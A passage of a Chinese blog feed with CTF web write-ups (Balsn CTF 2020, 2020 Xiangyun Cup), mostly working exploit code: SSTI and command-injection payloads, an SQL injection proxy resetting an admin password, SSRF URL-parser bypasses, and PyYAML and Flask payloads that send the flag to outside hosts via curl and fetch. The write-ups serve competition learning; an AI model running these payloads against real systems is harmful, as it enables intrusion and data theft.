/flag&quot;;    public function __construct()    {        $this-&gt;padding=new L5D_Command();    }}class L5D_Command{}$a=str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize(new L5D_Upload()));echo urlencode ($a);</code></pre><h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp，只能说一句牛逼</p><p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p><p>exp.py</p><pre><code class="python">from flask import Flaskapp = Flask(__name__)@app.route(&#39;/index.html&#39;)def hello_world():    r = &quot;&quot;&quot;    &lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function require(a){                if(a==&quot;express&quot;){return ()=&gt;{return {get:function(){},listen:function(){}}}                }                if(a==&quot;redis&quot;){                    return {createClient:function(){}}                }                if(a==&quot;fs&quot;){                    return {existsSync:function(){}};                }            }        &lt;/script&gt;        &lt;script src=&quot;../app/server.js&quot;&gt;        &lt;/script&gt;        &lt;script&gt;            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);        &lt;/script&gt;    &lt;/head&gt;    &lt;/html&gt;    &quot;&quot;&quot;    return r,{&quot;Content-Disposition&quot;:&#39;attachment; filename=&quot;wtf22.html&quot;&#39;}if(__name__==&quot;__main__&quot;):    app.run(&quot;0.0.0.0&quot;,4000)</code></pre><h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp</p><p>应该静下心来做的</p><pre><code class="python">import requestsimport timehost = &quot;windows-xp-media-player.balsnctf.com&quot;def req(s, path):    return s.get(&quot;http://{}{}&quot;.format(host, path))if __name__ == &quot;__main__&quot;:    s1 = requests.Session()    # create a session    resp = req(s1, &quot;/&quot;)    # use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in`     req(s1, &quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;)    # also create a `-z` folder    req(s1, &quot;/?args=./-z&amp;op=create&quot;)    # use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`    # since all of these folders exist ls will exit cleanly and add our args to the queue    req(s1, &quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;)    # remove the `--` from the queue    req(s1, &quot;/q/skip&quot;)    # shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`    # this writes final argument as a null terminated string to the specified output file    req(s1, &quot;/q/shuf&quot;)    # now /tmp/vakzz_in contains `/flag/\x00`    # rate limit    time.sleep(10)    # new session as need more playlists    s2 = requests.Session()    resp = req(s2, &quot;/&quot;)    # create the folder `--files0-from=/tmp/vakzz_in` for option injection    req(s2, &quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;)    # create the folder `--exclude=flag?[1-9]*` for option injection    req(s2, &quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;)    # now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args    # use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude    # anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`    resp = req(s2, &quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;)    # if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if     # the flag starts with 0-9 or a-f.    print(resp.text.split(&#39;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#39;)[2].split(&quot; &quot;)[0])</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p><pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/11/27/2020">https://www.ccreater.top/2020/11/27/2020</a> balsn ctf web 部分题解/](<a href="https://www.ccreater.top/2020/11/27/2020">https://www.ccreater.top/2020/11/27/2020</a> balsn ctf web 部分题解/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020祥云杯web题解</title>
      <link href="2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/"/>
      <url>2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="祥云杯web题解"><a href="#祥云杯web题解" class="headerlink" title="祥云杯web题解"></a>祥云杯web题解</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>题目源码</p><pre><code class="php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;url&#39;])) {  $ip=$_GET[&#39;url&#39;];  if(preg_match(&quot;/(;|&#39;| |&gt;|]|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\*|\{)/i&quot;, $ip)){      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;      alert(&#39;no no no!&#39;)      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);  }else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;      alert(&#39;no flag!&#39;)      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);  }  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);}</code></pre><p>测试发现过滤了:<code>&#39;,$,&amp;,*,;,&gt;,],{, ,</code><br>利用%09来绕过对空格的过滤</p><pre><code>http://eci-2ze5a6nc0glncs99tzta.cloudeci1.ichunqiu.com/?url=-h|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`</code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>测试一波发现输入点都没有ssti,并且开着报错</p><p>我们利用报错来拿源码</p><p>最关键的源码<code>render_template_string(guessNum(num,name))</code> 是直接访问不存在界面得到的</p><pre><code class="python">@app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])def Hello():    if request.method == &quot;POST&quot;:        user = request.form[&#39;name&#39;]        resp = make_response(render_template(&quot;guess.html&quot;,name=user))        resp.set_cookie(&#39;user&#39;,base64.urlsafe_b64encode(user),max_age=3600)        return resp    else:        user=request.cookies.get(&#39;user&#39;)        if user == None:           return render_template(&quot;index.html&quot;)        else:            user=user.encode(&#39;utf-8&#39;)            return render_template(&quot;guess.html&quot;,name=base64.urlsafe_b64decode(user))@app.route(&#39;/guess&#39;,methods=[&#39;POST&#39;])def Guess():    user=request.cookies.get(&#39;user&#39;)    if user==None:        return redirect(url_for(&quot;Hello&quot;)    user=user.encode(&#39;utf-8&#39;)    name = base64.urlsafe_b64decode(user)    num = float(request.form[&#39;num&#39;])    if(num&lt;0):        return &quot;Too Small&quot;    elif num&gt;1000000000.0:        return &quot;Too Large&quot;    else:        return render_template_string(guessNum(num,name))#直接提醒我们这里存在ssti注入@app.errorhandler(404)def miss(e):    return &quot;What are you looking for?!!&quot;.getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)), 404if __name__ == &#39;__main__&#39;:    f_handler=open(&#39;/var/log/app.log&#39;, &#39;w&#39;)    sys.stderr=f_handler    app.run(debug=True, host=&#39;0.0.0.0&#39;,port=8888</code></pre><p>看一下回显很容易得知bot利用二分法来猜数据，如果一定次数内bot没猜出来就是我们赢，正常的数据基本是不行的。</p><p>我们看下他得到数字的过程:</p><pre><code class="python">num = float(request.form[&#39;num&#39;])    if(num&lt;0):        return &quot;Too Small&quot;    elif num&gt;1000000000.0:        return &quot;Too Large&quot;</code></pre><p>字符串转数值且小于0大于1000000000.0</p><p>阅读python文档<a href="https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`" target="_blank" rel="noopener">https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`</a> float also accepts the strings “nan” and “inf” with an optional prefix “+” or “-” for Not a Number (NaN) and positive or negative infinity. `</p><p>且nan&lt;0,nan&gt;1000000000.0都为false,这样他的二分法永远猜不到了</p><p>然后修改name进行ssti</p><pre><code>{{"".__class__.__mro__[2].__subclasses__()[258].__init__.__getattribute__("__globals__")["\\x6f\\x73"].__getattribute__("\\x73ystem")("whoami")}}</code></pre><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><p>题目有三个接口，登入，查看上传文件，上传文件</p><p>测试上传文件接口发现，可以直接路径穿越</p><p>测试查看上传文件接口发现，可以任意文件读取，但是你得有cookie(通过文件上传生成)</p><p>/proc/self/cmdline</p><pre><code>HOSTNAME=engine-1 HOME=/root OLDPWD=/root TERM=xterm PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOPATH=/go PWD=/go GOLANG_VERSION=1.15.5</code></pre><p>刚开始去读/etc/passwd发现，啥都没有，但是读/proc/self/cmdline就有东西，然后猜测了下这是root权限启动的</p><p>由于重启docker环境并不是让cookie的salt发生改变，所以，如果用之前生成好的cookie(如果是root权限/etc/passwd被覆盖)去获得新docker的/etc/passwd有内容的话就说明是root权限，没有的话就是其他原因</p><p>。。。。。</p><p>真的是root权限！！！！！</p><p>直接读取/root/start.sh</p><pre><code class="bash">flagfile=/flagif [ ${ICQ_FLAG} ];then    if [ &quot;$flagfile&quot;x = &quot;/flagx&quot; ];then        echo ${ICQ_FLAG} &gt; ${flagfile}        chmod 755 ${flagfile}    else        #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; $flagfile        sed -i -r &quot;s/flag\{.*\}/${ICQ_FLAG}/&quot; $flagfile        #mysql -uroot -proot nXXXX &lt; $flagfile    fi    echo [+] sed flag OK    unset ICQ_FLAGelse    echo [!] no ICQ_FLAGfiservice cron start&amp;&amp;whoami&amp;&amp;cd /go&amp;&amp;go run src/main.go src/functions.go src/model.go src/routes.go</code></pre><p>再去读取/flag，顺便读了下源码：</p><p>main.go</p><pre><code class="go">package mainimport (    &quot;log&quot;    &quot;net/http&quot;)func main() {    http.Handle(&quot;/uploads/&quot;, http.StripPrefix(&quot;/uploads/&quot;, http.FileServer(http.Dir(&quot;uploads/&quot;))))    http.Handle(&quot;/statics/&quot;, http.StripPrefix(&quot;/statics/&quot;, http.FileServer(http.Dir(&quot;statics/&quot;))))    http.HandleFunc(&quot;/index&quot;, index)    http.HandleFunc(&quot;/&quot;, index)    http.HandleFunc(&quot;/login&quot;, login)    http.HandleFunc(&quot;/upload&quot;, upload)    http.HandleFunc(&quot;/show&quot;, show)    http.HandleFunc(&quot;/home&quot;, home)    err := http.ListenAndServe(&quot;:80&quot;, nil)    if err != nil {        log.Fatal(&quot;ListenAndServe: &quot;, err)    }}</code></pre><p>src/functions.go</p><pre><code class="go">package mainimport (    &quot;bytes&quot;    &quot;crypto/md5&quot;    &quot;encoding/base64&quot;    &quot;encoding/gob&quot;    &quot;encoding/hex&quot;    &quot;net/http&quot;    &quot;os&quot;    &quot;time&quot;)func PathExists(path string) (bool, error) {    _, err := os.Stat(path)    if err == nil {        return true, nil    }    if os.IsNotExist(err) {        return false, nil    }    return false, err}func fileExist(filename string) bool {    _, err := os.Stat(filename)    return err == nil || os.IsExist(err)}func Md5(s string) string {    h := md5.New()    h.Write([]byte(s))    return hex.EncodeToString(h.Sum(nil))}func getCookie(r *http.Request) interface{}{    cookie, err := r.Cookie(&quot;cookie&quot;)    if err==nil{        return cookie.Value    }else{        return nil    }}func setCookie(w http.ResponseWriter,r *http.Request,value string){    expiration := time.Now()    expiration = expiration.AddDate(1, 0, 0)//    fmt.Println(value)    cookie := http.Cookie{Name: &quot;cookie&quot;, Value: value, Expires: expiration}    http.SetCookie(w, &amp;cookie)}func serialize(instance Users) []byte{//    fmt.Println(instance.Username)    var result bytes.Buffer    encoder := gob.NewEncoder(&amp;result)    encoder.Encode(instance)    userBytes := result.Bytes()//    fmt.Printf(&quot;%s&quot;,userBytes)    return userBytes}func unseralize(data []byte) Users{    var account Users    decoder := gob.NewDecoder(bytes.NewReader(data))    decoder.Decode(&amp;account)    return account}func cookieEncode(data []byte) string{//    fmt.Printf(&quot;%s&quot;,data)    return base64.StdEncoding.EncodeToString(data)}func cookieDecode(data string) []byte{    bytesData, _ := base64.StdEncoding.DecodeString(data)    return bytesData}</code></pre><p>src/model.go</p><pre><code class="go">package maintype Users struct{    Username string    Password string    Filename string    Sign string}var salt=&quot;123123adsdasr123sdfkaadls&quot;</code></pre><p>src/routes.go</p><pre><code class="go">package mainimport (    &quot;encoding/base64&quot;    &quot;fmt&quot;    &quot;html/template&quot;    &quot;io&quot;    &quot;net/http&quot;    &quot;os&quot;    &quot;strings&quot;)//Route:uploadfunc upload(w http.ResponseWriter, r *http.Request) {    r.Body = http.MaxBytesReader(w, r.Body, 32&lt;&lt;16)    ip := strings.Split(r.RemoteAddr, &quot;:&quot;)[0]    if getCookie(r)!=nil{        UserData:=unseralize(cookieDecode(getCookie(r).(string)))        if r.Method == &quot;GET&quot; {            t, _ := template.ParseFiles(&quot;upload.gtpl&quot;)            t.Execute(w,nil)        } else {            path:=&quot;./uploads/&quot;+Md5(ip)            tmp,_:=PathExists(path)            if !tmp{                err:= os.Mkdir(path, os.ModePerm)                if err!=nil{                    fmt.Printf(&quot;failed&quot;)                }            }            r.ParseMultipartForm(32 &lt;&lt; 20)            file, handler, err := r.FormFile(&quot;uploadfile&quot;)            if err != nil {                fmt.Println(err)                return            }            defer file.Close()            f, err := os.OpenFile(&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0777)            if err != nil {                fmt.Fprint(w,err)                return            }            defer f.Close()            io.Copy(f, file)            UserData.Filename=&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename            UserData.Sign=Md5(UserData.Filename+salt)            setCookie(w,r,cookieEncode((serialize(UserData))))            fmt.Fprint(w,UserData)            fmt.Fprint(w,&quot;上传成功：&quot;+handler.Filename)            return        }    }else{        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)        return    }}//Route:/index || /func index(w http.ResponseWriter, r *http.Request) {    t, _ := template.ParseFiles(&quot;index.gtpl&quot;)    t.Execute(w,nil)    return}//Route:/loginfunc login(w http.ResponseWriter, r *http.Request) {    if r.Method==&quot;POST&quot;{        r.ParseForm()        if r.Form[&quot;username&quot;]==nil &amp;&amp; r.Form[&quot;password&quot;]==nil{            fmt.Fprint(w,&quot;username and password is required&quot;)            return        }        User:=Users{            Username: r.Form[&quot;username&quot;][0],            Password: r.Form[&quot;password&quot;][0],        }        setCookie(w,r,cookieEncode(serialize(User)))        fmt.Fprint(w,&quot;&lt;script&gt;window.location.href=&#39;/home&#39;&lt;/script&gt;&quot;)    }else{        fmt.Fprint(w,&quot;Method not allowed&quot;)        return    }}func home(w http.ResponseWriter,r *http.Request){    if getCookie(r)!=nil {        t, _ := template.ParseFiles(&quot;home.gtpl&quot;)        t.Execute(w, nil)    }else{        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)        return    }}//Route:/showfunc show(w http.ResponseWriter, r *http.Request) {    if getCookie(r)!=nil {        UserData:=unseralize(cookieDecode(getCookie(r).(string)))        file:=UserData.Filename        sign:=UserData.Sign        ff, err := os.Open(file)        defer ff.Close()        if err!=nil{            fmt.Println(err)            t, _ := template.ParseFiles(&quot;show.gtpl&quot;)            t.Execute(w, template.HTML(&quot;？？？？？&quot;))            return        }        fmt.Println(sign)        if sign!=Md5(file+salt){            fmt.Fprint(w,&quot;签名失败&quot;)            return        }        sourcebuffer := make([]byte, 500000)        n, _ := ff.Read(sourcebuffer)        filedata := base64.StdEncoding.EncodeToString(sourcebuffer[:n])        fmt.Println(filedata)        t, _ := template.ParseFiles(&quot;show.gtpl&quot;)        t.Execute(w, template.HTML(&quot;&lt;img src=&#39;data:image/jpeg;base64,&quot;+filedata+&quot;&#39;&gt;&quot;))    }else{        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)        return    }}</code></pre><p>这样应该是非预期把？</p><h2 id="doyouknowssrf"><a href="#doyouknowssrf" class="headerlink" title="doyouknowssrf"></a>doyouknowssrf</h2><pre><code class="php">&lt;?php// ini_set(&quot;display_errors&quot;, &quot;On&quot;);// error_reporting(E_ALL | E_STRICT);function safe_url($url,$safe) {    $parsed = parse_url($url);    $validate_ip = true;    if($parsed[&#39;port&#39;]  &amp;&amp; !in_array($parsed[&#39;port&#39;],array(&#39;80&#39;,&#39;443&#39;))){        echo &quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;.PHP_EOL;        return false;    }else{        preg_match(&#39;/^\d+$/&#39;, $parsed[&#39;host&#39;]) &amp;&amp; $parsed[&#39;host&#39;] = long2ip($parsed[&#39;host&#39;]);        $long = ip2long($parsed[&#39;host&#39;]);        if($long===false){            $ip = null;            if($safe){                @putenv(&#39;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#39;);                $ip   = gethostbyname($parsed[&#39;host&#39;]);                $long = ip2long($ip);                $long===false &amp;&amp; $ip = null;                @putenv(&#39;RES_OPTIONS&#39;);            }        }else{            $ip = $parsed[&#39;host&#39;];        }        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);    }    if(!in_array($parsed[&#39;scheme&#39;],array(&#39;http&#39;,&#39;https&#39;)) || !$validate_ip){        echo &quot;&lt;b&gt;{$url} 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;.PHP_EOL;        return false;    }else{        return $url;    }}function curl($url){    $safe = false;    if(safe_url($url,$safe)) {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);        $co = curl_exec($ch);        curl_close($ch);        echo $co;    }}highlight_file(__FILE__);curl($_GET[&#39;url&#39;]);</code></pre><p>emmm，这题是原题。<a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/" target="_blank" rel="noopener">https://tyaoo.github.io/2020/08/31/2020-GACTF-web/</a> ,我是后来才知道的。。。。</p><p>绕过端口限制的方法一种是：<code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code></p><p>还有一个是：<code>http:/ctf.ccreater.top:5000/</code></p><p><code>var_dump(parse_url)</code></p><pre><code>array(2) {  &#39;scheme&#39; =&gt;  string(4) &quot;http&quot;  &#39;path&#39; =&gt;  string(23) &quot;/ctf.ccreater.top:5000/&quot;}</code></pre><p>然后curl去访问是正常的</p><p>接下来按着那个wp走发现flask,继续ssrf，发现redis，原本是wp里面的redis主从复制RCE直接打这题的，但是试了好久都没成功，明明有向我发送数据</p><p>redis ssrf还有一种RCE方法是写文件，这一题就是这么干的，因为那个wp我一直没往这方面想</p><p>然后去看了写redis发现它的版本是2.x主从复制RCE的那个exp是针对3.x和4.x  ：(</p><h2 id="easyzzz"><a href="#easyzzz" class="headerlink" title="easyzzz"></a>easyzzz</h2><p>百度一波网上的cve解出这题</p><p>简单说下过程</p><p>/plugins/webuploader/js/webconfig.php</p><p>拿到后台地址  admin539/</p><p><a href="https://xz.aliyun.com/t/7414" target="_blank" rel="noopener">https://xz.aliyun.com/t/7414</a> ，利用前台sql注入修改管理员密码</p><p>搭个转发的方便测试</p><pre><code class="python">import requestsfrom flask import Flask,requestapp = Flask(__name__)def access(exp):    burp0_url = &quot;http://eci-2ze9cofh8j38ebxctduq.cloudeci1.ichunqiu.com:80/plugins/sms/sms_list.php?act=del&quot;    burp0_cookies = {&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1604567758,1604568322,1604568358,1605921830&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1606016268&quot;, &quot;PHPSESSID&quot;: &quot;3fe85864bb4ad1dc9f25e5271281baf9&quot;, &quot;__jsluid_h&quot;: &quot;85077cc270ca34654c02f2479fcb9390&quot;, &quot;zzz254_adminpass&quot;: &quot;0&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}    burp0_data = {&quot;id[={exp} ;-- ]&quot;.format(exp=exp): &quot;1&quot;}    return requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)@app.route(&#39;/&#39;)def hello_world():    payload = request.args.get(&quot;exp&quot;,&quot;&quot;)    r=access(payload)    print(payload)    return r.textapp.run()</code></pre><p>直接访问:</p><p><code>http://127.0.0.1:5000/?exp=1;replace INTO zzz_user(uid,u_gid, u_lid, u_onoff, u_order, sex, username, password, question, answer, regtime, truename, face, province, city, district, address, post, tel, mobile, email, qq, u_desc, adminrand, lastlogintime, lastloginip, logincount, sysinfo, points, balance) VALUES (1, 1, 1, 1, 0, &#39;%E7%94%B7&#39;, &#39;admin&#39;, &#39;1ccbbb718e0e9c3a&#39;, &#39;8TBRJ2H5NXW57EVF&#39;, &#39;S8DDQC9YV494G84Q&#39;, &#39;&#39;, &#39;%E5%88%9B%E5%A7%8B%E4%BA%BA&#39;, &#39;face01.png&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;6a79122eab1e8abd10bcabd91ebbc36c&#39;, &#39;2020/11/22 17:25:13&#39;, &#39;127.0.0.1&#39;, 6, &#39;&#39;, 0, 0);--</code></p><p>修改admin密码为041676</p><p>没有写权限，但是我们只要读到flag就好了，利用这个cms的模板渲染机制，修改模板为我们想读的文件/flag，来拿到flag</p><h2 id="profile-system"><a href="#profile-system" class="headerlink" title="profile system"></a>profile system</h2><p>一看就是一个flask(它的cookie)，文件上传可以目录穿越，猜测后端访问uploads路由是这样的：<code>/uploads/&lt;path:path&gt;</code><br>直接读取<code>/uploads/../app.py</code></p><p>app.py</p><pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_file,session,render_template_stringimport osimport refrom hashlib import md5import yamlapp = Flask(__name__)app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)app.config[&#39;SECRET_KEY&#39;] = &#39;Th1s_is_A_Sup333er_s1cret_k1yyyyy&#39;ALLOWED_EXTENSIONS = {&#39;yaml&#39;,&#39;yml&#39;}def allowed_file(filename):    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower()@app.route(&quot;/&quot;)def index():    session[&#39;priviledge&#39;] = &#39;guest&#39;    return &quot;home&quot;@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])def upload():    file = request.files[&quot;file&quot;]    if file.filename == &#39;&#39;:        flash(&#39;No selected file&#39;)        return redirect(&quot;/&quot;)    elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):        flash(&#39;Please upload yaml/yml only.&#39;)        return redirect(&quot;/&quot;)    else:        dirname = md5(request.remote_addr.encode()).hexdigest()        filename = file.filename        session[&#39;filename&#39;] = filename         upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)        if not os.path.exists(upload_directory):            os.mkdir(upload_directory)        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)        file.save(upload_path)        return os.path.join(dirname, filename)@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)def uploads(path):    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))@app.route(&quot;/view&quot;)def view():    dirname = md5(request.remote_addr.encode()).hexdigest()    realpath = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname,session[&#39;filename&#39;]).replace(&#39;..&#39;,&#39;&#39;)    if session[&#39;priviledge&#39;] ==&#39;elite&#39; and os.path.isfile(realpath):        try:            with open(realpath,&#39;rb&#39;) as f:                data = f.read()                if not re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE):                    info = {&#39;user&#39;: &#39;elite-user&#39;}                    flash(&#39;Sth weird...&#39;)                else:                    info = yaml.load(data)                if info[&#39;user&#39;] == &#39;Administrator&#39;:                    flash(&#39;Welcome admin!&#39;)                else:                    raise ()        except :            info = {&#39;user&#39;: &#39;elite-user&#39;}    else:        info = {&#39;user&#39;: &#39;guest&#39;}    return render_template_string(&quot;{{user}}&quot;,user=info[&#39;user&#39;])#.,^,_,`,~if __name__ == &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,port=8888,threaded=True)</code></pre><p>有了secret我们就可以任意伪造session了</p><p>注意到：<code>info = yaml.load(data)</code></p><p>直接使用这个会有个提醒</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201122221248.png" alt="image16652"></p><p>百度一下为啥不安全，yaml反序列化注入get</p><p>直接抄来一个exp</p><pre><code class="yaml">!!python/object/new:type  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:exec }]  listitems: &quot;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&quot;</code></pre><p>看下进入<code>info = yaml.load(data)</code> 的前提</p><p><code>re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE)</code></p><p>利用<a href="https://regex101.com/" target="_blank" rel="noopener">regex101</a>读懂这个的意思，其实就是禁止出现</p><pre><code>.^_`~</code></pre><p>这几个字符</p><p>这个payload完美符合所有条件</p><p>一定要注意payload不能出现\r</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的float类型有两个特殊的值：nan(not a number),inf(infinity,无穷)</p><p><strong>php parse_url 小trick</strong></p><p><code>var_dump(parse_url(&quot;http:/ctf.ccreater.top:5000/&quot;))</code></p><pre><code>array(2) {  &#39;scheme&#39; =&gt;  string(4) &quot;http&quot;  &#39;path&#39; =&gt;  string(23) &quot;/ctf.ccreater.top:5000/&quot;}</code></pre><p><code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code>:<a href="https://bugs.php.net/bug.php?id=77991" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77991</a></p><pre><code>var_dump(parse_url(&quot;http://foo@127.0.0.1:6379%20@www.baidu.com&quot;));php shell code:1:array(4) {  &#39;scheme&#39; =&gt;  string(4) &quot;http&quot;  &#39;host&#39; =&gt;  string(13) &quot;www.baidu.com&quot;  &#39;user&#39; =&gt;  string(13) &quot;foo@127.0.0.1&quot;  &#39;pass&#39; =&gt;  string(7) &quot;6379%20&quot;}</code></pre><p>python 中的yaml.load也存在反序列化问题</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/11/24/2020祥云杯web题解/">https://www.ccreater.top/2020/11/24/2020祥云杯web题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XNUCA_2020_oooooooldjs题解</title>
